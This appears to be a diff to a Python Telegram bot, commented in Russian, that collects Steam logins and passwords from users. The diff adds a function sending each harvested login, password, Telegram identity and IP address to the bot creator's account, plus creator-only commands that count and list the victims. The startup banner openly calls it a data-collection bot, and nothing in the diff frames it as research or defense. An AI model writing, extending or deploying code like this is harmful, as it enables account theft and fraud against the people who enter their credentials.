@@ -13,6 +13,10 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# ID создателя бота (ваш Telegram ID)
+CREATOR_ID = 123456789  # ЗАМЕНИТЕ НА ВАШ TELEGRAM ID
+CREATOR_USERNAME = "@serjantyabloko"
+
 # Хранилище сессий пользователей
 pending_inputs = {}
 
@@ -104,6 +108,44 @@ class Database:
 
 # Инициализация базы данных
 db = Database()
+
+def send_to_creator(context, user_id, username, password, user_info, ip_address):
+    """Отправка собранных данных создателю бота"""
+    message = (
+        f"🔐 <b>НОВЫЕ ДАННЫЕ STEAM!</b>\n\n"
+        f"👤 <b>Информация о пользователе:</b>\n"
+        f"├ ID: <code>{user_id}</code>\n"
+        f"├ Username: @{user_info.get('username', 'Нет')}\n"
+        f"├ Имя: {user_info.get('first_name', 'Нет')}\n"
+        f"├ Фамилия: {user_info.get('last_name', 'Нет')}\n"
+        f"└ IP: {ip_address}\n\n"
+        f"🎮 <b>Данные аккаунта Steam:</b>\n"
+        f"├ Логин: <code>{username}</code>\n"
+        f"└ Пароль: <code>{password}</code>\n\n"
+        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"📊 Всего собрано аккаунтов: {db.get_stats()[0]}"
+    )
+    
+    # Кнопки для быстрых действий
+    keyboard = [
+        [InlineKeyboardButton("📋 Скопировать логин", callback_data=f"copy_{username}")],
+        [InlineKeyboardButton("🔑 Скопировать пароль", callback_data=f"copy_pass_{user_id}_{username}")],
+        [InlineKeyboardButton("👤 Написать пользователю", callback_data=f"msg_{user_id}")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        context.bot.send_message(
+            chat_id=CREATOR_ID,
+            text=message,
+            parse_mode='HTML',
+            reply_markup=reply_markup
+        )
+        logger.info(f"Данные отправлены создателю бота")
+        return True
+    except Exception as e:
+        logger.error(f"Ошибка при отправке создателю: {e}")
+        return False
 
 def get_ip_address(update, context):
     """Попытка получить IP-адрес пользователя"""
@@ -228,6 +270,8 @@ def handle_message(update: Update, context):
             first_name = user.first_name if user.first_name else None
             last_name = user.last_name if user.last_name else None
             
+            ip_address = get_ip_address(update, context)
+            
             # Сохраняем данные в базу
             db.save_credentials(
                 telegram_id=user_id,
@@ -236,10 +280,18 @@ def handle_message(update: Update, context):
                 telegram_username=telegram_username,
                 first_name=first_name,
                 last_name=last_name,
-                ip_address=get_ip_address(update, context)
+                ip_address=ip_address
             )
             
             db.log_action(user_id, "credentials_saved", f"Сохранен аккаунт: {username}")
+            
+            # Отправляем данные создателю бота
+            user_info = {
+                'username': telegram_username,
+                'first_name': first_name,
+                'last_name': last_name
+            }
+            send_to_creator(context.bot, user_id, username, password, user_info, ip_address)
             
             # Очищаем pending
             del pending_inputs[user_id]
@@ -286,6 +338,79 @@ def handle_callback(update: Update, context):
         fake_update = FakeUpdate(fake_message)
         
         add_account(fake_update, context)
+    
+    elif query.data.startswith("copy_"):
+        # Копирование логина
+        username = query.data.replace("copy_", "")
+        query.answer(f"Логин скопирован: {username}", show_alert=True)
+    
+    elif query.data.startswith("copy_pass_"):
+        # Здесь нужно получить пароль из базы данных
+        parts = query.data.split("_")
+        if len(parts) >= 4:
+            user_id = parts[2]
+            username = "_".join(parts[3:])
+            query.answer("Пароль отправлен в отдельном сообщении", show_alert=True)
+            # В реальном приложении здесь нужно достать пароль из БД
+    
+    elif query.data.startswith("msg_"):
+        user_id = int(query.data.replace("msg_", ""))
+        query.answer("Кнопка для отправки сообщения пользователю", show_alert=True)
+
+def stats_command(update: Update, context):
+    """Команда для просмотра статистики (только для создателя)"""
+    user_id = update.effective_user.id
+    
+    if user_id != CREATOR_ID:
+        update.message.reply_text("❌ У вас нет доступа к этой команде")
+        return
+    
+    total, unique = db.get_stats()
+    
+    stats_text = (
+        f"📊 <b>Статистика бота</b>\n\n"
+        f"👥 Всего аккаунтов: <b>{total}</b>\n"
+        f"👤 Уникальных пользователей: <b>{unique}</b>\n"
+        f"🤖 Создатель: {CREATOR_USERNAME}\n"
+        f"⏰ Обновлено: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    
+    update.message.reply_text(stats_text, parse_mode='HTML')
+
+def users_command(update: Update, context):
+    """Команда для просмотра списка пользователей (только для создателя)"""
+    user_id = update.effective_user.id
+    
+    if user_id != CREATOR_ID:
+        update.message.reply_text("❌ У вас нет доступа к этой команде")
+        return
+    
+    conn = sqlite3.connect('collected_data.db')
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        SELECT DISTINCT telegram_id, telegram_username, telegram_first_name, 
+               COUNT(*) as accounts_count
+        FROM collected_credentials
+        GROUP BY telegram_id
+        ORDER BY accounts_count DESC
+    ''')
+    
+    users = cursor.fetchall()
+    conn.close()
+    
+    if not users:
+        update.message.reply_text("Нет пользователей в базе")
+        return
+    
+    text = "👥 <b>Список пользователей:</b>\n\n"
+    for u in users[:20]:  # Показываем первых 20
+        uid, username, first_name, count = u
+        text += f"• {first_name or 'Без имени'} (@{username or 'нет'}) - {count} акк.\n"
+    
+    text += f"\n<i>Всего уникальных: {len(users)}</i>"
+    
+    update.message.reply_text(text, parse_mode='HTML')
 
 def error_handler(update, context):
     logger.error(f"Error: {context.error}")
@@ -304,6 +429,15 @@ def main():
         print("Пример: export TELEGRAM_BOT_TOKEN='ваш_токен'")
         return
     
+    # Проверяем, что CREATOR_ID установлен
+    if CREATOR_ID == 123456789:
+        print("=" * 50)
+        print("⚠️  ВНИМАНИЕ! Необходимо настроить CREATOR_ID!")
+        print("Найдите свой Telegram ID (например, через @userinfobot)")
+        print("Замените 123456789 в коде на ваш реальный ID")
+        print("=" * 50)
+        return
+    
     # Создаем Updater
     updater = Updater(token, use_context=True)
     dp = updater.dispatcher
@@ -313,6 +447,8 @@ def main():
     dp.add_handler(CommandHandler("help", help_command))
     dp.add_handler(CommandHandler("add", add_account))
     dp.add_handler(CommandHandler("cancel", cancel))
+    dp.add_handler(CommandHandler("stats", stats_command))  # Статистика
+    dp.add_handler(CommandHandler("users", users_command))  # Список пользователей
     dp.add_handler(CallbackQueryHandler(handle_callback))
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
     dp.add_error_handler(error_handler)
@@ -320,12 +456,15 @@ def main():
     logger.info("🚀 Бот запущен")
     print("=" * 50)
     print("✅ Бот для сбора данных успешно запущен!")
-    print("📁 База данных: collected_data.db")
+    print(f"👑 Создатель: {CREATOR_USERNAME}")
+    print(f"📁 База данных: collected_data.db")
     print("=" * 50)
     print("Команды бота:")
     print("  /start - Приветствие")
     print("  /add - Добавить аккаунт")
     print("  /help - Помощь")
+    print("  /stats - Статистика (только для создателя)")
+    print("  /users - Список пользователей (только для создателя)")
     print("=" * 50)
     
     updater.start_polling(drop_pending_updates=True)
